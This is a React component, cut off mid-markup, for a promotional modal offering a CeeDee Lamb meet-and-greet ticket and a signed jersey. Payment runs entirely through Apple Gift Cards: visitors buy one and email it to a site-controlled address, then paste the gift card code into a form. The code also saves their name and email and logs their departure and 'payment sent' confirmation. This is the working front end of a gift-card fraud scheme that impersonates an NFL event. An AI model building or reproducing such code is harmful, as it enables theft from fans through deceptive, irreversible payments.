import React, { useEffect, useRef, useState } from "react";
import { motion, AnimatePresence } from "motion/react";
import {
  X,
  Check,
  Sparkles,
  Calendar,
  MapPin,
  ArrowRight,
  ExternalLink,
  User,
  Mail,
  Copy,
  CheckCircle2,
  AlertCircle,
  CreditCard,
  ShieldCheck,
  Loader2,
  Send,
} from "lucide-react";
import ceedeeSignedJerseyImg from "../assets/images/ceedee_lamb_signed_jersey_1795712835942.jpg";
import {
  APPLE_STORE_GIFT_CARD_URL,
  OFFICIAL_GIFTCARD_EMAIL,
} from "./common/GiftCardGuestPurchasePanel";
import {
  recordAppleCardPartnerDeparture,
  recordAppleCardSentConfirmation,
  getPendingAppleConfirmation,
} from "../services/paymentControlService";
import { CeeDeeLiveAvailabilityBar } from "./common/CeeDeeLiveAvailabilityBar";
import { cn } from "../lib/utils";

export const CEEDEE_REGULAR_TICKET_USD = 100;
export const CEEDEE_APPLE_PAY_DISCOUNT_USD = 5;
export const CEEDEE_DISCOUNTED_TICKET_USD = 95;
export const CEEDEE_SIGNED_JERSEY_ADDON_USD = 195;

export interface CeeDeePromoSelection {
  includeJersey: boolean;
  totalUsd: number;
  discountUsd: number;
  paymentPreference: "regular" | "other_methods";
  customerName?: string;
  customerEmail?: string;
}

interface CeeDeePublicPromoOfferModalProps {
  isOpen: boolean;
  initialIncludeJersey?: boolean;
  initialCustomerName?: string;
  initialCustomerEmail?: string;
  sessionId?: string;
  onClose: () => void;
  onSelectOffer: (selection: CeeDeePromoSelection) => void;
  onCustomerDetailsChange?: (name: string, email: string) => void;
}

const AppleLogoMark: React.FC<{ className?: string }> = ({ className }) => (
  <svg
    viewBox="0 0 24 24"
    fill="currentColor"
    aria-hidden="true"
    className={className || "w-4 h-4"}
  >
    <path d="M16.365 1.43c0 1.14-.493 2.27-1.177 3.08-.744.9-1.99 1.57-2.987 1.57-.12 0-.23-.02-.3-.03-.01-.06-.04-.22-.04-.39 0-1.15.572-2.27 1.206-2.98.804-.94 2.142-1.64 3.248-1.68.03.13.05.28.05.43zm4.565 15.71c-.03.07-.463 1.58-1.518 3.12-.945 1.34-1.94 2.71-3.43 2.71-1.517 0-1.9-.88-3.63-.88-1.698 0-2.302.91-3.67.91-1.377 0-2.332-1.26-3.428-2.8-1.287-1.82-2.323-4.63-2.323-7.28 0-4.28 2.797-6.55 5.552-6.55 1.448 0 2.675.95 3.6.95.865 0 2.222-1.01 3.902-1.01.613 0 2.886.06 4.374 2.19-.13.09-2.383 1.37-2.383 4.19 0 3.26 2.854 4.42 2.955 4.45z" />
  </svg>
);

export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalProps> = ({
  isOpen,
  initialIncludeJersey = false,
  initialCustomerName = "",
  initialCustomerEmail = "",
  sessionId,
  onClose,
  onSelectOffer,
  onCustomerDetailsChange,
}) => {
  const [includeJersey, setIncludeJersey] = useState<boolean>(initialIncludeJersey);
  const [customerName, setCustomerName] = useState<string>(
    () =>
      initialCustomerName ||
      getPendingAppleConfirmation()?.customerName ||
      localStorage.getItem("nfl_guest_sender_name") ||
      ""
  );
  const [customerEmail, setCustomerEmail] = useState<string>(
    () =>
      initialCustomerEmail ||
      getPendingAppleConfirmation()?.customerEmail ||
      localStorage.getItem("nfl_guest_buyer_email") ||
      ""
  );
  const [validationError, setValidationError] = useState<string | null>(null);
  const [copiedEmail, setCopiedEmail] = useState<boolean>(false);
  const [openedAppleStore, setOpenedAppleStore] = useState<boolean>(() => Boolean(getPendingAppleConfirmation()));
  const [returnedFromAppleStore, setReturnedFromAppleStore] = useState<boolean>(() => Boolean(getPendingAppleConfirmation()));
  const [isConfirmingSent, setIsConfirmingSent] = useState<boolean>(false);
  const [paymentSentConfirmed, setPaymentSentConfirmed] = useState<boolean>(false);
  const [confirmedRefId, setConfirmedRefId] = useState<string>("");
  const [appleOrderOrCodeNote, setAppleOrderOrCodeNote] = useState<string>("");
  const [fallbackSessionId] = useState<string>(
    () =>
      `INQ-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}`
  );
  const [pendingSessionOverride, setPendingSessionOverride] = useState<string | null>(
    () => getPendingAppleConfirmation()?.sessionId || null
  );

  const nameInputRef = useRef<HTMLInputElement | null>(null);
  const emailInputRef = useRef<HTMLInputElement | null>(null);

  useEffect(() => {
    setIncludeJersey(initialIncludeJersey);
  }, [initialIncludeJersey]);

  useEffect(() => {
    if (initialCustomerName) setCustomerName(initialCustomerName);
  }, [initialCustomerName]);

  useEffect(() => {
    if (initialCustomerEmail) setCustomerEmail(initialCustomerEmail);
  }, [initialCustomerEmail]);

  useEffect(() => {
    if (!isOpen) {
      setValidationError(null);
      return;
    }

    const pending = getPendingAppleConfirmation();
    if (pending && !paymentSentConfirmed) {
      setOpenedAppleStore(true);
      setReturnedFromAppleStore(true);
      setPendingSessionOverride(pending.sessionId);
      if (pending.customerName && !customerName.trim()) setCustomerName(pending.customerName);
      if (pending.customerEmail && !customerEmail.trim()) setCustomerEmail(pending.customerEmail);
    }

    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "Escape") {
        onClose();
      }
    };
    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [isOpen, onClose, paymentSentConfirmed]);

  // Detect visitor returning to this tab/window from Apple's official online store
  useEffect(() => {
    if (!isOpen || !openedAppleStore || paymentSentConfirmed) return;

    const markReturned = () => {
      setReturnedFromAppleStore(true);
    };

    const handleVisibility = () => {
      if (document.visibilityState === "visible") {
        markReturned();
      }
    };

    window.addEventListener("focus", markReturned);
    document.addEventListener("visibilitychange", handleVisibility);
    return () => {
      window.removeEventListener("focus", markReturned);
      document.removeEventListener("visibilitychange", handleVisibility);
    };
  }, [isOpen, openedAppleStore, paymentSentConfirmed]);

  if (!isOpen) return null;

  const trimmedName = customerName.trim();
  const trimmedEmail = customerEmail.trim();
  const isValidEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(trimmedEmail);
  const hasValidForm = trimmedName.length >= 2 && isValidEmail;

  const jerseyAddonTotal = includeJersey ? CEEDEE_SIGNED_JERSEY_ADDON_USD : 0;
  const discountedTotal = CEEDEE_DISCOUNTED_TICKET_USD + jerseyAddonTotal;
  const regularTotal = CEEDEE_REGULAR_TICKET_USD + jerseyAddonTotal;

  const activeSessionId = pendingSessionOverride || sessionId || fallbackSessionId;

  const handleNameChange = (val: string) => {
    setCustomerName(val);
    setValidationError(null);
    onCustomerDetailsChange?.(val, customerEmail);
  };

  const handleEmailChange = (val: string) => {
    setCustomerEmail(val);
    setValidationError(null);
    onCustomerDetailsChange?.(customerName, val);
  };

  const handleCopySupportEmail = () => {
    try {
      void navigator.clipboard.writeText(OFFICIAL_GIFTCARD_EMAIL);
    } catch {
      // ignore clipboard errors
    }
    setCopiedEmail(true);
    window.setTimeout(() => setCopiedEmail(false), 2400);
  };

  const handleValidationFailure = () => {
    if (trimmedName.length < 2) {
      setValidationError("Please enter your Full Name above before continuing.");
      nameInputRef.current?.focus();
      return;
    }
    if (!isValidEmail) {
      setValidationError("Please enter a valid Gmail address above before continuing.");
      emailInputRef.current?.focus();
    }
  };

  const handleDirectAppleStoreClick = () => {
    setValidationError(null);
    try {
      void navigator.clipboard.writeText(OFFICIAL_GIFTCARD_EMAIL);
      setCopiedEmail(true);
    } catch {
      // ignore clipboard errors
    }

    try {
      localStorage.setItem("nfl_guest_sender_name", trimmedName);
      localStorage.setItem("nfl_guest_buyer_email", trimmedEmail);
      sessionStorage.setItem("nfl_ceedee_public_promo_choice_v1", "apple_store_direct");
      sessionStorage.setItem("nfl_ceedee_public_promo_jersey_v1", String(includeJersey));
    } catch {
      // ignore storage errors
    }

    onCustomerDetailsChange?.(trimmedName, trimmedEmail);

    void recordAppleCardPartnerDeparture({
      sessionId: activeSessionId,
      customerName: trimmedName,
      customerEmail: trimmedEmail,
      customerPhone: trimmedEmail,
      itemTitle: `CeeDee Lamb Public Meet & Greet · December 26th${includeJersey ? " + Signed #88 Jersey" : ""}`,
      itemType: "experience",
      amount: discountedTotal,
      partnerName: "Apple Store Online",
      partnerUrl: APPLE_STORE_GIFT_CARD_URL,
      venue: "AT&T Stadium · Arlington, Texas",
    }).catch(() => {
      // non-blocking departure log
    });

    setOpenedAppleStore(true);
  };

  const handleConfirmPaymentSent = async () => {
    if (!hasValidForm) {
      handleValidationFailure();
      return;
    }
    setIsConfirmingSent(true);
    setValidationError(null);
    try {
      const cleanNote = appleOrderOrCodeNote.trim();
      const res = await recordAppleCardSentConfirmation({
        sessionId: activeSessionId,
        customerName: trimmedName,
        customerEmail: trimmedEmail,
        customerPhone: trimmedEmail,
        itemTitle: `CeeDee Lamb Public Meet & Greet · December 26th${includeJersey ? " + Signed #88 Jersey" : ""}`,
        itemType: "experience",
        amount: discountedTotal,
        venue: "AT&T Stadium · Arlington, Texas",
        ...(cleanNote ? { cardCode: cleanNote } : {}),
      });
      setConfirmedRefId(res?.orderId || activeSessionId);
      setPaymentSentConfirmed(true);
    } catch {
      setValidationError("Unable to record confirmation right now. Please try again.");
    } finally {
      setIsConfirmingSent(false);
    }
  };

  return (
    <AnimatePresence>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        transition={{ duration: 0.24, ease: "easeOut" }}
        className="fixed inset-0 z-[170] flex items-center justify-center p-3 sm:p-5 bg-[#020612]/88 backdrop-blur-md overflow-y-auto"
        role="dialog"
        aria-modal="true"
        aria-labelledby="ceedee-promo-offer-headline"
        onClick={(e) => {
          if (e.target === e.currentTarget) onClose();
        }}
      >
        <motion.div
          initial={{ opacity: 0, scale: 0.94, y: 16 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.96, y: 10 }}
          transition={{ duration: 0.3, ease: [0.16, 1, 0.3, 1] }}
          className="relative w-full max-w-3xl my-auto rounded-[1.75rem] border border-[#B0B7BC]/35 bg-[#040B1A] text-white shadow-[0_32px_90px_-15px_rgba(0,53,148,0.65)] overflow-hidden"
        >
          {/* Subtle Stadium Overhead Lighting & Metallic Silver Accent Hairline */}
          <div
            aria-hidden="true"
            className="absolute inset-0 pointer-events-none"
            style={{
              background:
                "radial-gradient(ellipse 85% 45% at 50% -5%, rgba(56, 189, 248, 0.22) 0%, rgba(0, 53, 148, 0.28) 38%, rgba(4, 11, 26, 0.96) 75%)",
            }}
          />
          <div
            aria-hidden="true"
            className="h-1 w-full bg-gradient-to-r from-[#002244] via-[#E2E8F0] to-[#002244]"
          />

          {/* Top Corner Controls: Other Payment Method (Left Corner) + Close (Right Corner) */}
          <button
            type="button"
            onClick={() =>
              onSelectOffer({
                includeJersey,
                totalUsd: regularTotal,
                discountUsd: 0,
                paymentPreference: "other_methods",
                customerName: trimmedName,
                customerEmail: trimmedEmail,
              })
            }
            className="absolute top-4 left-4 z-30 min-h-[38px] px-3 py-1.5 rounded-xl bg-[#09152E]/95 hover:bg-[#13244A] border border-[#60A5FA]/45 text-[11px] font-bold uppercase tracking-wider text-[#93C5FD] hover:text-white inline-flex items-center gap-1.5 transition-colors cursor-pointer shadow-md"
          >
            <CreditCard className="w-3.5 h-3.5 shrink-0" />
            <span>Other Payment Method</span>
          </button>

          <button
            type="button"
            onClick={onClose}
            aria-label="Close exclusive fan offer"
            className="absolute top-4 right-4 z-30 w-10 h-10 rounded-full bg-[#09152E]/90 hover:bg-[#13244A] border border-[#B0B7BC]/30 flex items-center justify-center text-[#E2E8F0] hover:text-white transition-colors cursor-pointer"
          >
            <X className="w-4 h-4" />
          </button>

          {/* Scrollable Container for Smaller Mobile Viewports */}
          <div className="relative z-10 px-5 pb-6 pt-16 sm:p-8 sm:pt-16 max-h-[88vh] overflow-y-auto space-y-5">
            {/* 1. Top Badge & Headline */}
            <div className="text-center space-y-2.5">
              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-md bg-[#002244]/90 border border-[#B0B7BC]/40 text-[11px] font-black uppercase tracking-[0.22em] text-[#E2E8F0] shadow-[0_0_22px_rgba(56,189,248,0.18)]">
                <Sparkles className="w-3.5 h-3.5 text-[#7DD3FC]" />
                <span>EXCLUSIVE FAN OFFER</span>
              </div>

              <h2
                id="ceedee-promo-offer-headline"
                className="font-display font-black uppercase tracking-tight text-white leading-[1.02] text-2xl sm:text-4xl"
              >
                YOUR FAN EXPERIENCE{" "}
                <span className="bg-gradient-to-r from-white via-[#E2E8F0] to-[#93C5FD] bg-clip-text text-transparent">
                  JUST GOT BETTER!
                </span>
              </h2>

              <p className="text-xs sm:text-sm text-[#CBD5E1] max-w-xl mx-auto leading-relaxed">
                Save on your meet-and-greet ticket with Apple Pay and explore the opportunity to take home a signed CeeDee Lamb jersey.
              </p>

              <div className="flex flex-wrap items-center justify-center gap-x-4 gap-y-1 pt-0.5 text-[11px] font-semibold text-[#94A3B8]">
                <span className="inline-flex items-center gap-1.5 text-[#E2E8F0]">
                  <Calendar className="w-3.5 h-3.5 text-[#60A5FA]" />
                  December 26th
                </span>
                <span aria-hidden="true" className="text-[#475569]">•</span>
                <span className="inline-flex items-center gap-1.5 text-[#E2E8F0]">
                  <MapPin className="w-3.5 h-3.5 text-[#60A5FA]" />
                  AT&amp;T Stadium · Arlington, Texas
                </span>
              </div>
            </div>

            {/* Live Real-Time Slot Count, Dec 26 Countdown & Recent Fan Reservations */}
            <CeeDeeLiveAvailabilityBar variant="full" />

            {/* 2. Prominent 5% Discount Section */}
            <div className="rounded-2xl border border-[#B0B7BC]/30 bg-gradient-to-br from-[#07142E] via-[#050F24] to-[#030917] p-4 sm:p-5 shadow-[0_14px_40px_-12px_rgba(0,53,148,0.55)]">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                <div className="space-y-2 flex-1">
                  <div className="flex flex-wrap items-center gap-2.5">
                    <span className="text-[11px] font-black uppercase tracking-[0.2em] text-[#B0B7BC]">
                      MEET &amp; GREET TICKET
                    </span>
                    <motion.span
                      animate={{
                        boxShadow: [
                          "0 0 0px rgba(56, 189, 248, 0.25)",
                          "0 0 18px rgba(56, 189, 248, 0.65)",
                          "0 0 0px rgba(56, 189, 248, 0.25)",
                        ],
                      }}
                      transition={{ duration: 2.4, repeat: Infinity, ease: "easeInOut" }}
                      className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-md bg-gradient-to-r from-[#003594] to-[#0284C7] border border-[#E2E8F0]/45 text-[11px] font-black uppercase tracking-wider text-white"
                    >
                      5% OFF
                    </motion.span>
                  </div>

                  <div className="grid grid-cols-2 gap-2 max-w-xs text-xs">
                    <div className="text-[#94A3B8]">Regular Price:</div>
                    <div className="font-mono font-semibold text-[#CBD5E1] line-through tabular-nums text-right sm:text-left">
                      $100.00
                    </div>
                    <div className="text-[#7DD3FC] font-medium">Apple Pay Discount:</div>
                    <div className="font-mono font-bold text-[#7DD3FC] tabular-nums text-right sm:text-left">
                      −$5.00
                    </div>
                  </div>

                  <p className="text-xs text-[#CBD5E1] leading-relaxed">
                    Enjoy 5% savings when you complete your ticket purchase using Apple Pay.
                  </p>
                </div>

                {/* Most Visually Prominent Price Element */}
                <div className="sm:text-right shrink-0 rounded-xl bg-[#030816]/90 border border-[#7DD3FC]/35 px-4 py-3 sm:min-w-[205px] shadow-[inset_0_1px_0_rgba(255,255,255,0.08)]">
                  <span className="text-[10px] font-black uppercase tracking-[0.18em] text-[#7DD3FC] block">
                    YOUR DISCOUNTED PRICE
                  </span>
                  <div className="font-mono font-black text-white text-4xl sm:text-[2.65rem] leading-none tracking-tight mt-1 tabular-nums drop-shadow-[0_0_24px_rgba(56,189,248,0.35)]">
                    $95.00
                  </div>
                  <span className="text-[11px] font-medium text-[#94A3B8] mt-1 block">
                    Public Meet &amp; Greet Admission
                  </span>
                </div>
              </div>
            </div>

            {/* 3. Signed Jersey Promotional Feature & Optional Selectable Add-On */}
            <div
              className={cn(
                "rounded-2xl border transition-all duration-200 p-4 sm:p-5 relative overflow-hidden",
                includeJersey
                  ? "border-[#E2E8F0]/65 bg-gradient-to-br from-[#0A1A3A] via-[#061126] to-[#040B1A] shadow-[0_0_32px_rgba(147,197,253,0.2)]"
                  : "border-[#B0B7BC]/25 bg-[#050E22]/90 hover:border-[#B0B7BC]/45"
              )}
            >
              <div
                aria-hidden="true"
                className="absolute -left-10 top-1/2 -translate-y-1/2 w-56 h-56 rounded-full pointer-events-none opacity-45 blur-2xl"
                style={{
                  background:
                    "radial-gradient(circle, rgba(147,197,253,0.45) 0%, rgba(0,53,148,0) 72%)",
                }}
              />

              <div className="relative z-10 grid grid-cols-1 sm:grid-cols-12 gap-4 items-center">
                <div className="sm:col-span-5">
                  <div className="relative rounded-xl overflow-hidden border border-[#B0B7BC]/45 bg-[#030816] aspect-[4/3] shadow-[0_12px_30px_rgba(0,0,0,0.55)]">
                    <img
                      src={ceedeeSignedJerseyImg}
                      alt="Authentic Hand-Signed CeeDee Lamb #88 Dallas Cowboys Jersey"
                      className="w-full h-full object-cover"
                      referrerPolicy="no-referrer"
                    />
                    <div
                      aria-hidden="true"
                      className="absolute inset-0 bg-gradient-to-t from-[#030816]/80 via-transparent to-transparent"
                    />
                    <div className="absolute bottom-2 left-2.5 right-2.5 flex items-center justify-between gap-2 text-[10px] font-bold uppercase tracking-wider text-[#E2E8F0]">
                      <span>#88 Lamb · Authenticated</span>
                      <span className="font-mono text-[#7DD3FC]">
                        +${CEEDEE_SIGNED_JERSEY_ADDON_USD}.00
                      </span>
                    </div>
                  </div>
                </div>

                <div className="sm:col-span-7 space-y-3">
                  <div>
                    <span className="text-[10px] font-black uppercase tracking-[0.2em] text-[#93C5FD] block">
                      Optional Add-On · Separate Purchase · In Stock
                    </span>
                    <h3 className="font-display font-black uppercase tracking-tight text-white text-lg sm:text-xl mt-0.5">
                      TAKE HOME A PIECE OF THE MOMENT!
                    </h3>
                    <p className="text-xs text-[#CBD5E1] mt-1 leading-relaxed">
                      Make your fan experience even more memorable with a signed CeeDee Lamb jersey.
                    </p>
                  </div>

                  <div className="rounded-xl bg-[#030816]/85 border border-white/10 p-3 text-[11px] text-[#CBD5E1] space-y-1">
                    <div className="flex items-center justify-between gap-2">
                      <span className="font-bold text-white">
                        Signed CeeDee Lamb #88 Cowboys Jersey
                      </span>
                      <span className="font-mono font-black text-white tabular-nums shrink-0">
                        ${CEEDEE_SIGNED_JERSEY_ADDON_USD}.00 USD
                      </span>
                    </div>
                    <p className="text-[#94A3B8] leading-snug">
                      Offered as an optional separate add-on (not included in the base ticket). Includes authentication certificate; available for Dec 26th AT&amp;T Stadium pickup or insured shipping.
                    </p>
                  </div>

                  <label
                    htmlFor="ceedee-signed-jersey-toggle"
                    className={cn(
                      "flex items-center justify-between gap-3 p-3 rounded-xl border cursor-pointer transition-all select-none",
                      includeJersey
                        ? "bg-[#003594]/45 border-[#93C5FD] text-white"
                        : "bg-[#030816]/80 border-[#B0B7BC]/25 hover:border-[#B0B7BC]/50 text-[#E2E8F0]"
                    )}
                  >
                    <div className="flex items-center gap-2.5 min-w-0">
                      <input
                        id="ceedee-signed-jersey-toggle"
                        type="checkbox"
                        checked={includeJersey}
                        onChange={(e) => setIncludeJersey(e.target.checked)}
                        className="sr-only"
                      />
                      <span
                        className={cn(
                          "w-5 h-5 rounded-md border flex items-center justify-center shrink-0 transition-colors",
                          includeJersey
                            ? "bg-[#38BDF8] border-[#38BDF8] text-[#030816]"
                            : "bg-[#040B1A] border-[#B0B7BC]/50 text-transparent"
                        )}
                      >
                        <Check className="w-3.5 h-3.5 stroke-[3]" />
                      </span>
                      <span className="text-xs font-extrabold tracking-tight truncate">
                        Add Signed CeeDee Lamb #88 Jersey
                      </span>
                    </div>
                    <span className="font-mono text-xs font-black text-[#7DD3FC] shrink-0 tabular-nums">
                      +${CEEDEE_SIGNED_JERSEY_ADDON_USD}.00
                    </span>
                  </label>
                </div>
              </div>
            </div>

            {/* 4. Dynamic Summary */}
            <div className="rounded-xl bg-[#030816]/95 border border-[#B0B7BC]/25 px-4 py-3 flex flex-col sm:flex-row sm:items-center justify-between gap-2 text-xs">
              <div className="space-y-0.5 text-[#CBD5E1]">
                <span className="font-bold uppercase tracking-wider text-[#94A3B8] text-[10px] block">
                  Selected Summary
                </span>
                <span>
                  Public Meet &amp; Greet Ticket (${CEEDEE_DISCOUNTED_TICKET_USD}.00 w/ 5% Promo
                  {includeJersey ? ` + Signed Jersey $${CEEDEE_SIGNED_JERSEY_ADDON_USD}.00` : ""})
                </span>
              </div>
              <div className="flex items-baseline gap-2.5 sm:text-right">
                <span className="text-xs font-mono text-[#94A3B8] line-through tabular-nums">
                  ${regularTotal.toFixed(2)}
                </span>
                <span className="text-xl font-mono font-black text-white tabular-nums">
                  ${discountedTotal.toFixed(2)} USD
                </span>
              </div>
            </div>

            {/* 5. Customer Name & Gmail Form Before Action Buttons */}
            <div className="rounded-2xl bg-[#061229]/90 border border-[#60A5FA]/30 p-4 sm:p-5 space-y-3.5">
              <div>
                <h3 className="text-xs sm:text-sm font-black uppercase tracking-wider text-white">
                  Enter Your Name &amp; Gmail Before Proceeding
                </h3>
                <p className="text-[11px] text-[#94A3B8] mt-0.5">
                  Required to link your December 26th AT&amp;T Stadium Meet &amp; Greet reservation with your payment.
                </p>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div className="space-y-1.5">
                  <label
                    htmlFor="promo-customer-name"
                    className="text-[10px] font-black uppercase tracking-wider text-[#CBD5E1] flex items-center gap-1.5"
                  >
                    <User className="w-3.5 h-3.5 text-[#60A5FA]" />
                    Full Name <span className="text-rose-400">*</span>
                  </label>
                  <input
                    ref={nameInputRef}
                    id="promo-customer-name"
                    type="text"
                    required
                    autoComplete="name"
                    placeholder="Enter your full name"
                    value={customerName}
                    onChange={(e) => handleNameChange(e.target.value)}
                    className="w-full min-h-[46px] bg-[#030816] border border-[#B0B7BC]/30 focus:border-[#60A5FA] rounded-xl px-3.5 py-2.5 text-sm text-white font-semibold placeholder-[#64748B] focus:outline-none"
                  />
                </div>

                <div className="space-y-1.5">
                  <label
                    htmlFor="promo-customer-gmail"
                    className="text-[10px] font-black uppercase tracking-wider text-[#CBD5E1] flex items-center gap-1.5"
                  >
                    <Mail className="w-3.5 h-3.5 text-[#60A5FA]" />
                    Gmail Address <span className="text-rose-400">*</span>
                  </label>
                  <input
                    ref={emailInputRef}
                    id="promo-customer-gmail"
                    type="email"
                    required
                    autoComplete="email"
                    placeholder="yourname@gmail.com"
                    value={customerEmail}
                    onChange={(e) => handleEmailChange(e.target.value)}
                    className="w-full min-h-[46px] bg-[#030816] border border-[#B0B7BC]/30 focus:border-[#60A5FA] rounded-xl px-3.5 py-2.5 text-sm text-white font-semibold placeholder-[#64748B] focus:outline-none"
                  />
                </div>
              </div>

              {validationError && (
                <div className="flex items-center gap-2 text-xs font-bold text-rose-300 bg-rose-500/10 border border-rose-500/30 rounded-xl px-3 py-2">
                  <AlertCircle className="w-4 h-4 shrink-0" />
                  <span>{validationError}</span>
                </div>
              )}
            </div>

            {/* 6. Clear 3-Step Apple Gift Card Guide + Copy Where to Send */}
            <div className="rounded-2xl bg-[#051229] border border-[#60A5FA]/35 p-4 sm:p-5 space-y-3.5">
              <div className="flex items-start gap-2.5 text-xs text-[#E2E8F0] leading-relaxed">
                <ShieldCheck className="w-4 h-4 text-[#7DD3FC] shrink-0 mt-0.5" />
                <div>
                  <p className="font-black uppercase tracking-wider text-white text-[11px]">
                    How To Complete Your ${discountedTotal.toFixed(2)} Apple Gift Card Payment (3 Easy Steps)
                  </p>
                  <p className="text-[11px] text-[#94A3B8] mt-0.5">
                    Apple Gift Cards are accepted as confirmation payments for your CeeDee Lamb Meet &amp; Greet ticket. Apple will not redirect automatically, so follow these steps:
                  </p>
                </div>
              </div>

              {/* 3-Step Visual Checklist */}
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-2.5 text-[11px]">
                <div className="rounded-xl bg-[#030816]/90 border border-white/10 p-3 space-y-1">
                  <span className="inline-flex items-center justify-center px-2 py-0.5 rounded bg-[#003594]/70 text-[#7DD3FC] font-mono font-bold text-[10px]">
                    STEP 1
                  </span>
                  <p className="font-bold text-white">Copy Our Email Below</p>
                  <p className="text-[#94A3B8] leading-snug">
                    Tap <strong className="text-white">Copy Email</strong> (also copied automatically when you tap the Apple button).
                  </p>
                </div>

                <div className="rounded-xl bg-[#030816]/90 border border-white/10 p-3 space-y-1">
                  <span className="inline-flex items-center justify-center px-2 py-0.5 rounded bg-[#003594]/70 text-[#7DD3FC] font-mono font-bold text-[10px]">
                    STEP 2
                  </span>
                  <p className="font-bold text-white">Buy ${discountedTotal.toFixed(2)} Email Card</p>
                  <p className="text-[#94A3B8] leading-snug">
                    On Apple Store, pick <strong className="text-white">Email Delivery</strong>, type{" "}
                    <strong className="text-emerald-300 font-mono">${discountedTotal.toFixed(2)}</strong>, and paste{" "}
                    <strong className="text-white font-mono">{OFFICIAL_GIFTCARD_EMAIL}</strong> as Recipient.
                  </p>
                </div>

                <div className="rounded-xl bg-[#030816]/90 border border-white/10 p-3 space-y-1">
                  <span className="inline-flex items-center justify-center px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300 font-mono font-bold text-[10px]">
                    STEP 3
                  </span>
                  <p className="font-bold text-white">Come Back &amp; Confirm</p>
                  <p className="text-[#94A3B8] leading-snug">
                    Switch back to this tab after Apple sends it and tap{" "}
                    <strong className="text-emerald-300">&ldquo;Yes, I Have Sent My Payment&rdquo;</strong>.
                  </p>
                </div>
              </div>

              {/* Copyable Official Delivery Email Box */}
              <div className="rounded-xl bg-[#030816] border border-[#60A5FA]/40 p-3 flex flex-col sm:flex-row sm:items-center justify-between gap-2.5">
                <div className="min-w-0">
                  <span className="text-[10px] font-bold uppercase tracking-wider text-[#94A3B8] block">
                    Paste This As Apple Recipient Email:
                  </span>
                  <span className="font-mono text-xs sm:text-sm font-black text-white select-all break-all">
                    {OFFICIAL_GIFTCARD_EMAIL}
                  </span>
                </div>
                <button
                  type="button"
                  onClick={handleCopySupportEmail}
                  className="min-h-[40px] px-3.5 py-2 rounded-lg bg-[#003594]/70 hover:bg-[#003594] border border-[#60A5FA]/50 text-xs font-bold text-white inline-flex items-center justify-center gap-1.5 shrink-0 cursor-pointer transition-colors"
                >
                  {copiedEmail ? (
                    <>
                      <Check className="w-3.5 h-3.5 text-emerald-400" />
                      <span className="text-emerald-300">Copied! Paste on Apple</span>
                    </>
                  ) : (
                    <>
                      <Copy className="w-3.5 h-3.5 text-[#7DD3FC]" />
                      <span>Copy Email</span>
                    </>
                  )}
                </button>
              </div>

              {!openedAppleStore && !paymentSentConfirmed && (
                <div className="flex items-center justify-between gap-2 pt-0.5 text-[11px]">
                  <span className="text-[#94A3B8]">
                    Already bought and mailed your Apple Gift Card to {OFFICIAL_GIFTCARD_EMAIL}?
                  </span>
                  <button
                    type="button"
                    onClick={() => {
                      setOpenedAppleStore(true);
                      setReturnedFromAppleStore(true);
                    }}
                    className="font-bold text-emerald-300 hover:text-emerald-200 underline shrink-0 cursor-pointer"
                  >
                    Confirm Sent Payment
                  </button>
                </div>
              )}
            </div>

            {/* 7. Return-From-Apple Confirmation Selector ("Have You Sent Your Payment?") */}
            {paymentSentConfirmed ? (
              <motion.div
                initial={{ opacity: 0, y: 6 }}
                animate={{ opacity: 1, y: 0 }}
                className="rounded-2xl bg-emerald-500/12 border border-emerald-400/50 p-4 sm:p-5 space-y-2.5 text-center"
              >
                <div className="w-11 h-11 rounded-full bg-emerald-500/20 border border-emerald-400/40 flex items-center justify-center mx-auto">
                  <CheckCircle2 className="w-6 h-6 text-emerald-400" />
                </div>
                <h4 className="text-sm sm:text-base font-black uppercase tracking-wide text-white">
                  Apple Card Payment Sent Confirmed!
                </h4>
                <p className="text-xs text-[#CBD5E1] max-w-md mx-auto leading-relaxed">
                  Thank you, <strong className="text-white">{trimmedName}</strong>. We have logged your confirmation for <strong className="text-white">${discountedTotal.toFixed(2)} USD</strong> (Ref: <span className="font-mono text-emerald-300">{confirmedRefId}</span>) and alerted our desk at <span className="font-mono text-white">{OFFICIAL_GIFTCARD_EMAIL}</span>. Once verified, your AT&amp;T Stadium Meet &amp; Greet pass will be sent to <strong className="text-white">{trimmedEmail}</strong>.
                </p>
              </motion.div>
            ) : openedAppleStore && (
              <motion.div
                initial={{ opacity: 0, y: 6 }}
                animate={{ opacity: 1, y: 0 }}
                className="rounded-2xl bg-[#071A38] border border-emerald-400/45 p-4 sm:p-5 space-y-3"
              >
                <div className="space-y-1">
                  <span className="text-[10px] font-black uppercase tracking-[0.18em] text-emerald-300 block">
                    {returnedFromAppleStore
                      ? "Welcome Back From Apple Store Online"
                      : "Apple Store Online Opened in New Tab"}
                  </span>
                  <h4 className="text-sm sm:text-base font-black uppercase tracking-tight text-white">
                    Have You Sent Your Apple Gift Card Payment?
                  </h4>
                  <p className="text-xs text-[#CBD5E1] leading-relaxed">
                    Once you finish purchasing and sending your Apple Gift Card to <span className="font-mono text-white">{OFFICIAL_GIFTCARD_EMAIL}</span> on Apple&apos;s site, click the button below to notify our desk immediately.
                  </p>
                </div>

                <input
                  type="text"
                  value={appleOrderOrCodeNote}
                  onChange={(e) => setAppleOrderOrCodeNote(e.target.value)}
                  placeholder="Optional: Paste Apple Order # or Gift Card Code (X...)"
                  className="w-full min-h-[42px] bg-[#030816] border border-emerald-400/30 focus:border-emerald-400 rounded-xl px-3.5 py-2 text-xs font-mono text-white placeholder-[#64748B] focus:outline-none"
                />

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
                  <button
                    type="button"
                    disabled={isConfirmingSent}
                    onClick={handleConfirmPaymentSent}
